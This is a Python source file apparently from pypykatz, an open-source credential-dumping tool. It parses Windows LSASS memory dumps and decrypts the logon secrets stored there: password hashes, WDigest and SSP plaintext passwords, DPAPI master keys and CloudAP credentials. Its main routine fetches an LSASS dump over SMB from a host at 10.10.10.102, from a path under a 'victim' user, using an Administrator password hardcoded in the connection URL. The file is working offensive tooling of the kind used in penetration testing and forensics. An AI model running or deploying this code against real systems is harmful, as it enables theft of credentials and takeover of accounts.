#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import platform
import json
import asyncio
import base64
import traceback

from pypykatz.commons.common import KatzSystemInfo
from pypykatz.alsadecryptor import CredmanTemplate, MsvTemplate, \
	MsvDecryptor, WdigestTemplate, LsaTemplate, WdigestDecryptor, \
	LiveSspTemplate, LiveSspDecryptor, SspDecryptor, SspTemplate, \
	TspkgDecryptor, TspkgTemplate, \
	DpapiTemplate, DpapiDecryptor, LsaDecryptor,CloudapTemplate,\
	CloudapDecryptor
#KerberosTemplate, KerberosDecryptor, 
from pypykatz.alsadecryptor.packages.msv.decryptor import LogonSession
from pypykatz import logger
from pypykatz.commons.common import UniversalEncoder
from minidump.aminidumpfile import AMinidumpFile
from minikerberos.common.ccache import CCACHE
from pypykatz._version import __version__

class apypykatz:
	def __init__(self, reader, sysinfo):
		self.reader = reader
		self.sysinfo = sysinfo
		self.credentials = []
		self.architecture = None
		self.operating_system = None
		self.buildnumber = None
		self.lsa_decryptor = None
		
		self.logon_sessions = {}
		self.orphaned_creds = []
		self.errors = []
		self.kerberos_ccache = CCACHE()
		
	def to_dict(self):
		t = {}
		t['logon_sessions'] = {}
		for ls in self.logon_sessions:
			# print(ls)
			t['logon_sessions'][ls] = (self.logon_sessions[ls].to_dict())
		t['orphaned_creds'] = []
		for oc in self.orphaned_creds:
			t['orphaned_creds'].append(oc.to_dict())
		
		t['errors'] = []
		for pkg, err in self.errors:
			err_str = str(err) +'\r\n' + '\r\n'.join(traceback.format_tb(err.__traceback__))
			err_str = base64.b64encode(err_str.encode()).decode()
			t['errors'].append((pkg,err_str))
		return t
		
	def to_json(self):
		return json.dumps(self.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True)

	def to_grep(self):
		res = ':'.join(LogonSession.grep_header) + '\r\n'
		for luid in self.logon_sessions:
			for row in self.logon_sessions[luid].to_grep_rows():
				res += ':'.join(row) + '\r\n'
				for cred in self.orphaned_creds:
					t = cred.to_dict()
					if t['credtype'] != 'dpapi':
						if t['password'] is not None:
							x =  [str(t['credtype']), str(t['domainname']), str(t['username']), '', '', '', '', '', str(t['password'])]
							res += ':'.join(x) + '\r\n'
					else:
						t = cred.to_dict()
						x = [str(t['credtype']), '', '', '', '', '', str(t['masterkey']), str(t['sha1_masterkey']), str(t['key_guid']), '']
						res += ':'.join(x) + '\r\n'
				
				for pkg, err in self.errors:
					err_str = str(err) +'\r\n' + '\r\n'.join(traceback.format_tb(err.__traceback__))
					err_str = base64.b64encode(err_str.encode()).decode()
					x =  [pkg+'_exception_please_report', '', '', '', '', '', '', '', err_str]
					res += ':'.join(x) + '\r\n'

		return res

	def __str__(self):
		res = '== Logon credentials ==\r\n'
		for luid in self.logon_sessions:
			res += str(self.logon_sessions[luid]) + '\r\n'
			
		if len(self.orphaned_creds) > 0:
			res += '== Orphaned credentials ==\r\n'
			for cred in self.orphaned_creds:
				res += str(cred) + '\r\n'
		
		if len(self.errors) > 0:
			res += '== Errors ==\r\n'
			for pkg, err in self.errors:
				err_str = str(err) +'\r\n' + '\r\n'.join(traceback.format_tb(err.__traceback__))
				err_str = base64.b64encode(err_str.encode()).decode()
				res += '%s %s \r\n' % (pkg+'_exception_please_report',err_str) 
		
		return res
		
	@staticmethod
	async def parse_minidump_file(filename, packages = ['all'], chunksize=10*1024):
		try:
			minidump = await AMinidumpFile.parse(filename)
			reader = minidump.get_reader().get_buffered_reader(chunksize)
			sysinfo = KatzSystemInfo.from_minidump(minidump)
		except Exception as e:
			logger.exception('Minidump parsing error!')
			raise e
		try:
			mimi = apypykatz(reader, sysinfo)
			await mimi.start(packages)
		except Exception as e:
			#logger.info('Credentials parsing error!')
			mimi.log_basic_info()
			raise e
		return mimi

	@staticmethod
	async def parse_minidump_external(handle, packages = ['all'], chunksize=10*1024):
		"""
		Parses LSASS minidump file based on the file object.
		File object can really be any object as longs as 
		it implements read, seek, tell functions with the 
		same parameters as a file object would.

		handle: file like object
		"""
		minidump = await AMinidumpFile.parse_external(handle)
		reader = minidump.get_reader().get_buffered_reader(chunksize)
		sysinfo = KatzSystemInfo.from_minidump(minidump)
		mimi = apypykatz(reader, sysinfo)
		await mimi.start(packages)
		return mimi

		
	def log_basic_info(self):
		"""
		In case of error, please attach this to the issues page
		"""
		logger.info('===== BASIC INFO. SUBMIT THIS IF THERE IS AN ISSUE =====')
		logger.info('pypyKatz version: %s' % __version__)
		logger.info('CPU arch: %s' % self.sysinfo.architecture.name)
		logger.info('OS: %s' % self.sysinfo.operating_system)
		logger.info('BuildNumber: %s' % self.sysinfo.buildnumber)
		logger.info('MajorVersion: %s ' % self.sysinfo.major_version)
		logger.info('MSV timestamp: %s' % self.sysinfo.msv_dll_timestamp)
		logger.info('===== BASIC INFO END =====')
		
	async def get_logoncreds(self):
		credman_template = CredmanTemplate.get_template(self.sysinfo)
		msv_template = MsvTemplate.get_template(self.sysinfo)
		logoncred_decryptor = MsvDecryptor(self.reader, msv_template, self.lsa_decryptor, credman_template, self.sysinfo)
		await logoncred_decryptor.start()
		self.logon_sessions = logoncred_decryptor.logon_sessions

	async def get_lsa_bruteforce(self):
		#good luck!
		logger.debug('Testing all available templates! Expect warnings!')
		for lsa_dec_template in LsaTemplate.get_template_brute(self.sysinfo):
			try:
				lsa_dec = LsaDecryptor.choose(self.reader, lsa_dec_template, self.sysinfo)
				await lsa_dec.acquire_crypto_material()
				lsa_dec.dump()
			except:
				pass
			else:
				logger.debug('Lucky you! Brutefoce method found a -probably- working template!')
				return lsa_dec
	
	async def get_lsa(self):
		#trying with automatic template detection
		try:
			lsa_dec_template = LsaTemplate.get_template(self.sysinfo)
			lsa_dec = LsaDecryptor.choose(self.reader, lsa_dec_template, self.sysinfo)
			await lsa_dec.acquire_crypto_material()
			lsa_dec.dump()
		except Exception as e:
			logger.debug('Failed to automatically detect correct LSA template! Reason: %s' % str(e))
			lsa_dec = await self.get_lsa_bruteforce()
			if lsa_dec is None:
				raise Exception('All detection methods failed.')
			return lsa_dec
		else:
			return lsa_dec
	
	async def get_wdigest(self):
		decryptor_template = WdigestTemplate.get_template(self.sysinfo)
		decryptor = WdigestDecryptor(self.reader, decryptor_template, self.lsa_decryptor, self.sysinfo)
		await decryptor.start()
		for cred in decryptor.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].wdigest_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
	
	async def get_tspkg(self):
		tspkg_dec_template = TspkgTemplate.get_template(self.sysinfo)
		tspkg_dec = TspkgDecryptor(self.reader, tspkg_dec_template, self.lsa_decryptor, self.sysinfo)
		await tspkg_dec.start()
		for cred in tspkg_dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].tspkg_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
				
	async def get_ssp(self):
		dec_template = SspTemplate.get_template(self.sysinfo)
		dec = SspDecryptor(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
		await dec.start()
		for cred in dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].ssp_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
				
	async def get_livessp(self):
		livessp_dec_template = LiveSspTemplate.get_template(self.sysinfo)
		livessp_dec = LiveSspDecryptor(self.reader, livessp_dec_template, self.lsa_decryptor, self.sysinfo)
		await livessp_dec.start()
		for cred in livessp_dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].livessp_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
				
	async def get_dpapi(self):
		dec_template = DpapiTemplate.get_template(self.sysinfo)
		dec = DpapiDecryptor(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
		await dec.start()
		for cred in dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].dpapi_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
	
	#async def get_kerberos(self, with_tickets = True):
	#	dec_template = KerberosTemplate.get_template(self.sysinfo)
	#	dec = KerberosDecryptor(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
	#	await dec.start()
	#	for cred in dec.credentials:
	#		for ticket in cred.tickets:
	#			for fn in ticket.kirbi_data:
	#				self.kerberos_ccache.add_kirbi(ticket.kirbi_data[fn].native)
	#		
	#		if cred.luid in self.logon_sessions:
	#			self.logon_sessions[cred.luid].kerberos_creds.append(cred)
	#		else:
	#			self.orphaned_creds.append(cred)
	
	async def get_cloudap(self):
		cloudap_dec_template = CloudapTemplate.get_template(self.sysinfo)
		if cloudap_dec_template is None:
			return
		cloudap_dec = CloudapDecryptor(self.reader, cloudap_dec_template, self.lsa_decryptor, self.sysinfo)
		await cloudap_dec.start()
		for cred in cloudap_dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].cloudap_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)

	async def start(self, packages = ['all']):
		#self.log_basic_info()
		#input()
		self.lsa_decryptor = await self.get_lsa()
		if 'msv' in packages or 'all' in packages:
			try:
				await self.get_logoncreds()
			except Exception as e:
				self.errors.append(('msv', e))

		if 'wdigest' in packages or 'all' in packages:
			try:
				await self.get_wdigest()
			except Exception as e:
				self.errors.append(('wdigest', e))
		
		#if 'kerberos' in packages or 'ktickets' in packages or 'all' in packages:
		#	with_tickets = False
		#	if 'ktickets' in packages or 'all' in packages:
		#		with_tickets = True
		#	await self.get_kerberos(with_tickets)
		
		if 'tspkg' in packages or 'all' in packages:
			try:
				await self.get_tspkg()
			except Exception as e:
				self.errors.append(('tspkg', e))
		
		if 'ssp' in packages or 'all' in packages:
			try:
				await self.get_ssp()
			except Exception as e:
				self.errors.append(('ssp', e))
		
		if 'livessp' in packages or 'all' in packages:
			try:
				await self.get_livessp()
			except Exception as e:
				self.errors.append(('livessp', e))
		
		if 'dpapi' in packages or 'all' in packages:
			try:
				await self.get_dpapi()
			except Exception as e:
				self.errors.append(('dpapi', e))
		
		if 'cloudap' in packages or 'all' in packages:
			try:
				await self.get_cloudap()
			except Exception as e:
				self.errors.append(('cloudap', e))

async def amain():
	from aiosmb.commons.connection.url import SMBConnectionURL
	from pypykatz.alsadecryptor.asbmfile import SMBFileReader

	import sys
	f=sys.argv[1]
	print(f)

	url = 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102/C$/Users/victim/Desktop/lsass.DMP'
	smburl = SMBConnectionURL(url)
	connection = smburl.get_connection()
	smbfile = smburl.get_file()

	async with connection:
		_, err = await connection.login()
		if err is not None:
			raise err
		
		_, err = await smbfile.open(connection)
		if err is not None:
			raise err

		mimi = await apypykatz.parse_minidump_external(SMBFileReader(smbfile))
		print(mimi)

def main():
	import logging
	logging.basicConfig(level=1)
	asyncio.run(amain())

if __name__ == '__main__':
	main()